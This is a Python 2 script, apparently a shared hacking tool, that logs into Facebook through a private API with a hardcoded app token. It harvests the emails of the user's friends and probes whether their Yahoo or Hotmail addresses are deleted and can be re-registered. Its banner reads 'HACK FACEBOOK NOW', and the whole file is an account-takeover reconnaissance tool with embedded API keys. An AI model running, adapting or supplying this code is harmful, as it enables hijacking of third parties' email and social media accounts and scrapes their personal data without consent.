# encoding=utf8
# mod: ⊱XͭPͪLͤᗝIƬ༻₁₀₀ᵏ
#!usr
# -*- coding: UTF-8 -*-
# team: Solo No Team

import requests
import sys
import json
import os
import re
import mechanize
import urllib
import time
import random
import cookielib

wd = "\033[90;1m" # dark
GL = "\033[96;1m" # Blue aqua
BB = "\033[34;1m" # Blue light
YY = "\033[33;1m" # Yellow light
GG = "\033[32;1m" # Green light
WW = "\033[0;1m"  # White light
RR = "\033[31;1m" # Red light
CC = "\033[36;1m" # Cyan light
B = "\033[34m"    # Blue
Y = "\033[33;1m"    # Yellow
G = "\033[32m"    # Green
W = "\033[0;1m"     # White
R = "\033[31m"    # Red
C = "\033[36;1m"    # Cyan

def runntxt(s):
        for noobs in s + '\n':
                sys.stdout.write(noobs)
                sys.stdout.flush()
                time.sleep(10. / 2100)


def banner():
    print " "
    runntxt(GL+"              ⊱XͭPͪLͤᗝIƬ༻₁₀₀ᵏ")
    print GG+"√==========================================√"
    print GL+"   |••••••   TOOLS YAHOO CLONING  ••••••| "
    print GG+"√==========================================√"
    print WW+"  |            MOD BY: ⊱XͭPͪLͤᗝIƬ༻₁₀₀ᵏ            |"
    print GL+"  |       Khusus Fb yang Kerad bisa guna ni       |"
    print WW+"  |            FACEBOOK: --            |"
    print Y+"  |             INSTAGRAM: --              |"
    print GL+"  |---------------------------------------------|"
    print GL+"  | Github: TheSploit [⊱XͭPͪLͤᗝIƬ༻₁₀₀ᵏ]         |"
    print GL+"  |---------------------------------------------|"
    print GG+"  √=============================================√"
    print GL+"  |•••••••••   HACK FACEBOOK NOW    •••••••••|"
    print GG+"  √=============================================√"

banner()

print wd+"         https://www.github.com/TheSploit "
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
os.system("clear")
idt = raw_input("\033[39m[\033[31m*\033[39m] Email   : ")
passw = raw_input("\033[39m[\033[31m*\033[39m] Password: ")
url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + (idt) + "&locale=en_US&password=" + (passw) + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
data = urllib.urlopen(url)
op = json.load(data)
if 'access_token' in op:
    token = (op["access_token"])
    print ("\033[39m[\033[31m+\033[39m] Login Berhasil")
else:
    print ("\033[39m[\033[31m+\033[39m] \033[31mLogin Gagal!")
    sys.exit()
get_friends = requests.get('https://graph.facebook.com/me/friends?access_token='+token)
hasil = json.loads(get_friends.text)
print ("\033[39m[\033[31m+\033[39m] Berhasil Mendapatkan ID Teman...")
cok = open('Mail_Yahoo.txt','w')
def defense():
    global o, h
    o = []
    h = 0
    print "\033[36m" + 55*"-"
    print "\033[36m| " + 11*" " + "\033[35mEmail" + 14*" " + "\033[36m|" + 9*" " + "\033[33mVuln" + 8*" " + "\033[36m|"
    print 55*"-"
    for i in hasil['data']:
        wrna = "\033[36m"
        wrne = "\033[39m"
        h +=1
        o.append(h)
        x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+token)
        z = json.loads(x.text)
        try:
            kunci = re.compile(r'@.*')
            cari = kunci.search(z['email']).group()
            if 'yahoo.com' in cari:
                br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
                br._factory.is_html = True
                br.select_form(nr=0)
                br["username"] = z['email']
                j = br.submit().read()
                Zen = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    cd = Zen.search(j).group()
                except:
                    vuln = 6*" " + "\033[31mNot Vuln"
                    #Email Len
                    lean = 30 - (len(z['email']))
                    eml = lean * " "
                    #Name Len
                    lone = 24 - (len(vuln))
                    namel = lone * " "
                    print "\033[36m| " + wrna + z['email'] + eml + "\033[36m| " + wrne + vuln + namel + " \033[36m|"
                    continue
                if '"messages.ERROR_INVALID_USERNAME">' in cd:
                    vuln = 8*" " + "\033[32mVuln"
                else:
                    vuln = 5*" " + "\033[31mNot Vuln"
                #Email Len
                lean = 30 - (len(z['email']))
                eml = lean * " "
                #Name Len
                #Author: ⊱XͭPͪLͤᗝIƬ༻₁₀₀ᵏ
                lone = 24 - (len(vuln))
                namel = lone * " "
                print "\033[36m| " + wrna + z['email'] + eml + "\033[36m| " + wrne + vuln + namel + " \033[36m|"
            elif 'hotmail' in cari:
                url = ("http://apilayer.net/api/check?access_key=7a58ece2d10e54d09e93b71379677dbb&email=" + z['email'] + "&smtp=1&format=1")
                cek = json.loads(requests.get(url).text)
                if cek['smtp_check'] == 0:
                    vuln = 8*" " + "\033[32mVuln"

                else:
                    vuln = 5*" " + "\033[31mNot Vuln"
                lean = 30 - (len(z['email']))
                eml = lean * " "
                #Name Len
                #Author: ⊱XͭPͪLͤᗝIƬ༻₁₀₀ᵏ
                lone = 24 - (len(vuln))
                namel = lone * " "
                print "\033[36m| " + wrna + z['email'] + eml + "\033[36m|  " + wrne + vuln + namel + "\033[36m|"
            else:
                pass
        except KeyError:
            pass
defense()